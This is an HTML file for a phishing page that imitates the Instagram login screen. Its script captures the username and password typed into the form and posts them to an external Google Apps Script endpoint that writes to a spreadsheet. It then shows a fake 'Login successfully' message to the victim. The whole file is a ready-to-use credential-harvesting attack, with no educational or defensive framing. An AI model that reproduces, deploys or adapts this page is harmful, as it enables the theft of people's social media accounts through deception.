<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/fav.png">
    <link rel="stylesheet" href="style.css">

    
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="images/insta.png" alt="">

            <form name="submit-to-google-sheet">
                <input type="text" class="form-control mb-2" name="username" placeholder="Phone number, username, or email">
                <input type="password" class="form-control mb-2" name="password"placeholder="Password">
                <button class="btn btn-primary w-100">Log in</button>
            </form>
            <span id="msg"></span>
            <hr>
            <div class="text-center">
                <button class="btn btn-link text-primary"><i class="bi bi-facebook"></i> Log in with Facebook</button>
                <p><a href="#">Forgot password?</a></p>
            </div>
        </div>
        <div class="text-center mt-3">
            <p>Don't have an account? <a href="login.html">Sign up</a></p>
        </div>
    </div>

    <script>
        const scriptURL = '<https://script.google.com/macros/s/AKfycbzPEWOgsSoRnnwgNT4JKuF9mkFUWDiKEu6Po0sl5Q6cVfds1YMKn9oM6aPSlLeM_Ffd/exec>'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then((response) => {
                msg.innerHTML = "Login successfully";
                setTimeout(() => {
                    msg.innerHTML = "";
                }, 1000);
                form.reset();
            })
            .catch((error) => {
                console.error('Error!', error.message);
                msg.innerHTML = "Error sending message. Please try again.";
                setTimeout(() => {
                    msg.innerHTML = "";
                }, 3000);
            });
        })
      </script>
</body>
</html>
